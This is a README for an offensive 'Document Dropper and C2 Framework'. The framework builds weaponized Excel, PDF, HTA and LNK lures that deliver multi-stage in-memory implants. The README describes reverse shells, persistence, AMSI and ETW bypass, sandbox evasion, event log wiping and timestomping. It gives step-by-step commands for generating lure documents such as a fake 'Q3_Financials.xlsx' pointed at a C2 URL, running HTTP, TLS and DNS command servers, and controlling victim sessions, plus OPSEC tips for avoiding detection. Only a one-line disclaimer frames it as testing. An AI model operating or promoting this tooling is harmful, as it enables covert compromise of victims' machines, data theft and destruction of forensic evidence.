# Nightshade C4
(Project_Nightshade upgrade xox)

Document Dropper and C2 Framework.

---

## Overview

Nightshade C4 generates weaponized documents (Excel, PDF, HTA, LNK) that deploy multi-stage, in-memory payloads with encrypted C2 communication, sandbox evasion, AMSI bypass, ETW patching, and anti-forensic countermeasures.

The framework consists of two components: a document generator and a C2 server. Documents are distributed to target systems; the C2 server manages implant sessions, queues commands, and collects results.


## DISCLAIMER

For authorized security testing and Educational Purposes only.

---

## Features

### Payload Capabilities

- **Three-tier payload system**: Reverse shell (raw TCP), RCE beacon (HTTP C2), full implant (HTTP C2 + WMI persistence)
- **Multi-stage staging**: Stage 0 (sleep + DNS beacon, zero malicious static signature), Stage 1 (evasion preamble + decompress Stage 2), Stage 2 (implant execution)
- **Evasion chain**: AMSI bypass (4 polymorphic variants), ETW patching, multi-factor sandbox detection (VM model, analysis tools, disk count, disk size, RAM, CPU cores, username, boot time, process count)
- **Beacon jitter**: Variable 45-120s check-in intervals
- **Payload obfuscation**: Polymorphic PowerShell with random casing, backtick insertion, char encoding, GZip compression, junk comment injection

### Document Types

| Type | Technique | Trigger | Persistence Required |
|------|-----------|---------|---------------------|
| Excel (.xlsx) | OLE Template Injection | User clicks "Enable Content" | No |
| PDF (.pdf) | OpenAction JavaScript | Document opens | No |
| HTA (.hta) | VBScript/JS execution | Document opens | No |
| LNK (.lnk) | Shortcut + obfuscated PowerShell | User double-clicks | No |

### C2 Infrastructure

- HTTP staging server with TLS support
- DNS-based C2 channel (protocol-encoded commands in subdomain queries)
- Ngrok tunnel management (TCP and HTTP)
- Time-based domain rotation (hourly cycling through realistic domains)
- Custom domain support

### Anti-Forensics

- Mark-of-the-Web (Zone.Identifier) automatic stripping
- File timestamp randomization (timestomping)
- Self-delete on completion
- Event log wiping (application, security, system, PowerShell operational)

### Security

- AES-256-GCM authenticated encryption with HKDF-SHA256 key derivation
- Self-signed TLS certificate generation for HTTPS C2
- Database-logged request history and command audit trail
- Per-campaign encryption keys (auto-generated)

---

## Installation

### Requirements

- Python 3.9+
- Pip dependencies (see requirements.txt)

### Setup

```bash
git clone https://github.com/ekomsSavior/nightshadeRANGER.git
cd nightshadeRANGER
pip install -r requirements.txt
```

For TLS support, the cryptography library is required (included in requirements.txt).

### Ngrok (Optional)

For tunnel-based delivery:

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

---

## Usage

### Interactive Document Generation

```bash
python3 nightshade.py generate
```

Walks through a wizard to configure:
- Encryption key (auto-generated or custom)
- Payload tier (1-3)
- C2 address and port
- Document type (xlsx, pdf, hta, lnk)
- Delivery method (ngrok, domain rotation, custom domain)
- Multi-stage payload toggle
- Anti-forensics options (self-delete, timestomping, MotW stripping, log wiping)

### Headless Generation

```bash
python3 nightshade.py generate --headless --config config.yaml
```

Environment variables can also be used:

```bash
NIGHTSHADE_KEY="your-key" \
NIGHTSHADE_C2_URL="http://your-server:8080" \
NIGHTSHADE_TIER="2" \
NIGHTSHADE_DOC="xlsx" \
NIGHTSHADE_OUTPUT="Q3_Financials.xlsx" \
python3 nightshade.py generate --headless
```

### Starting the C2 Server

```bash
# HTTP (default port 8080)
python3 nightshade.py serve

# HTTPS with TLS
python3 nightshade.py serve --tls --port 443

# Custom port
python3 nightshade.py serve --port 8080 --host 0.0.0.0

# With a specific encryption key
python3 nightshade.py serve --key "your-encryption-key"
```

When the server starts, it listens for:
- Template requests from documents (GET /template.ole)
- Implant check-ins (POST /c2/checkin)
- Command results (POST /c2/result)
- Administrative commands (POST /c2/command)

The server console provides interactive commands:
- `sessions` - List active implant sessions
- `cmd <session_id> <command>` - Queue a command for a specific session
- `interact <session_id>` - Open an interactive shell with a session
- `history` - View command history
- `export` - Export task results as CSV
- `stats` - Show server statistics
- `help` - Show available commands
- `quit` - Stop the server

### DNS C2 Listener

```bash
python3 nightshade.py dns --domain c2.example.com --port 53
```

The DNS C2 handler encodes commands as subdomain queries. Implants resolve A/AAAA records for check-ins and receive commands via TXT record responses. This requires a nameserver that the target can resolve queries against.

DNS C2 console commands:
- `sessions` - List active DNS sessions
- `cmd <session_id> <command>` - Queue a command for a session
- `results <session_id>` - View session results
- `quit` - Stop the listener

### Configuration File

```bash
# Create a default config
python3 nightshade.py config --init

# View current config
python3 nightshade.py config --show
```

Example config.yaml:

```yaml
c2_url: "http://127.0.0.1:8080"
lhost: "127.0.0.1"
lport: 4444
tier: 2
doc_type: "xlsx"
output: "nightshade_output.xlsx"
template_url: ""
multi_stage: true
dns_c2: false
dns_domain: "dns-c2.local"
key: ""
```

### TLS Certificate Management

```bash
# Generate a new certificate
python3 nightshade.py cert --generate --common-name nightshade-c2.local --campaign default

# List existing certificates
python3 nightshade.py cert --list

# Custom key size and validity
python3 nightshade.py cert --generate --key-size 4096 --validity 730
```

Certificates are stored in the `certs/` directory and auto-loaded when starting the server with `--tls`.

---

## Payload Architecture

### Single-Stage

The document contains a compressed, encrypted PowerShell payload. When the template loads, it decrypts and executes the payload directly.

1. Document opens -> OLE template fetches from C2 server
2. Server returns encrypted payload
3. Document decrypts and executes via PowerShell

### Multi-Stage (3 Stages)

The document contains a minimal Stage 0 beacon. The payload is delivered in three stages to reduce document footprint and evade static analysis.

1. **Stage 0**: Embedded in document. Sleeps 3-8 seconds, then resolves a DNS A/AAAA query or makes a simple HTTP GET request to check in. Contains no malicious logic visible to static analysis.
2. **Stage 1**: Returned by the C2 server in response to the Stage 0 beacon. Contains AMSI bypass, ETW patch, sandbox detection, and the GZip-compressed Stage 2 payload.
3. **Stage 2**: Decompressed and executed by Stage 1. The actual implant (reverse shell, RCE beacon, or full agent).

### Tier 1: Reverse Shell

Direct TCP connection back to the C2 server. Best for immediate interactive access.

- Transport: Raw TCP
- Persistence: Scheduled task
- Shell: PowerShell interactive session

### Tier 2: RCE Beacon

HTTPS beacon that checks in for commands and posts results. Best for stealthy command execution.

- Transport: HTTP C2
- Persistence: Scheduled task + Registry (HKCU run key)
- Protocol: Encrypted beacon with variable jitter

### Tier 3: Full Agent

Maximum capability implant with redundant persistence.

- Transport: HTTP C2
- Persistence: Scheduled task + Registry + WMI event subscription
- Protocol: Encrypted beacon with modulus-based variable jitter

---

## Evasion Chain

When a multi-stage payload executes, the following evasion sequence runs on the target system (not the operator's machine):

1. **Sleep delay**: 3-8 seconds initial delay (evades sandbox timeouts)
2. **AMSI bypass**: One of 4 polymorphic variants (registry patch, memory patch, amsiInitFailed flag, registry disable)
3. **ETW bypass**: Patch .NET EventLogger.EventProviderEnabled
4. **Sandbox detection**: Multi-factor check on VM model, analysis tools, disk count, disk size (<120GB), RAM (<2GB), CPU cores (<2), username patterns, boot time (<10 min)
5. **If sandbox detected**: Payload silently exits with no indicators
6. **Mark-of-Web removal**: Delete Zone.Identifier streams
7. **Timestomping**: Randomize file timestamps
8. **Payload execution**: Decompress and execute Stage 2
9. **Self-delete**: Remove the document and temporary files (optional)
10. **Beacon jitter**: Variable 45-120s between check-ins

---

## C2 API Reference

| Endpoint | Method | Description |
|---|---|---|
| /template.ole | GET | Serve dropper template (validates User-Agent) |
| /c2/checkin | POST | Implant beacon (encrypted) |
| /c2/result | POST | Task result callback (encrypted) |
| /c2/command | POST | Submit command to session |
| /c2/sessions | GET | List active sessions |
| /c2/tasks | GET | View task queue (optional ?session_id=) |
| /c2/history | GET | Task history (supports ?format=csv) |
| /admin/stats | GET | Server statistics |
| /stage0/<session_id> | GET | Stage 1 payload delivery endpoint |

### Session Management

Sessions are tracked server-side with:
- Unique session ID generated per campaign
- IP address, hostname, and username of the implant
- Check-in count and timestamp
- Status (active/expired)

Commands are queued per-session. Each implant receives one command per check-in. Results are associated with the originating session and stored in the SQLite database.

---

## OPSEC Notes

- The staging server rejects requests without legitimate Office or PDF User-Agent headers
- Encryption keys are per-campaign; each deployment should use a unique key
- No hardcoded IPs or domains in the framework -- all addresses are configurable
- Variable jitter prevents detection via fixed-interval beaconing patterns
- DNS C2 queries use base32 encoding to avoid base64 fingerprinting
- The C2 server validates session IDs on all check-in requests
- TLS certificates are self-signed; for production, use a trusted CA or internal CA

---

## Architecture

```
                    +-----------------------+
                    |   Nightshade C4 C2    |
                    |   Server (Flask)      |
                    |   :8080 (HTTP/TLS)    |
                    +-----------+-----------+
                                |
          +---------------------+----------------------+
          |                     |                      |
          v                     v                      v
   +-----------+         +-------------+         +-----------+
   | Staging  |         | C2 Beacon  |         | Reverse   |
   | :8080    |         | :8080/c2/* |         | Shell     |
   | /template|         | endpoints  |         | :4444     |
   +-----+----+         +------+------+         +-----+-----+
         |                      |                      |
         v                      v                      v
    Documents               Implants              TCP Shells
    (xlsx/pdf/              (HTTP)                (raw TCP)
     hta/lnk)

   +-------------------------------------------------------+
   |          DNS C2 Handler (:53/udp)                     |
   |          Subdomain-encoded check-in + commands        |
   +-------------------------------------------------------+
```

---


<img width="866" height="150" alt="image4" src="https://github.com/user-attachments/assets/cb946934-dd9f-4c3c-ba3f-2f9198ddf60e" />
